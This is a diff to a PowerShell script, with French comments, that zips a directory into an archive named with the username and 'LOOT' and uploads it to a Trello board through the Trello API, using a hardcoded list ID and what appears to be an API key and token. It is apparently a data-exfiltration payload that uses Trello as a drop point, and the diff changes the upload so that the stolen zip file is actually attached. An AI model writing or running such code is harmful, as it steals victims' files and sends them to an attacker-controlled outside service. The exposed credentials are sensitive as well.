@@ -93,6 +93,9 @@ function ZipFiles {
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 }
 
+# Create the zip file
+ZipFiles
+
 # Replace the following values with your own
 $name = "${username}_LOOT_${dateSansHeure}"
 $idList = "65c269cf32172bbc68af098b"
@@ -103,18 +106,24 @@ $token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83
 $url = "https://api.trello.com/1/cards"
 
 # Données JSON pour la création de la carte
-$data = @"
-{
-  "name": "$name",
-  "idList": "$idList",
-  "key": "$key",
-  "token": "$token"
+$data = @{
+    "name" = $name
+    "idList" = $idList
+    "key" = $key
+    "token" = $token
 }
-"@
 
-# Envoi de la requête POST avec Invoke-RestMethod
-$response = Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $data -UseBasicParsing
+# Convertir les données JSON en chaîne
+$jsonData = $data | ConvertTo-Json
 
+# Créer un objet FormData pour l'envoi de fichiers
+$formData = @{
+    "data" = $jsonData
+    "file" = Get-Item -Path $zipFilePath
+}
+
+# Envoi de la requête POST multipart/form-data avec Invoke-RestMethod
+$response = Invoke-RestMethod -Uri $url -Method Post -Form $formData -UseBasicParsing
 
 
 
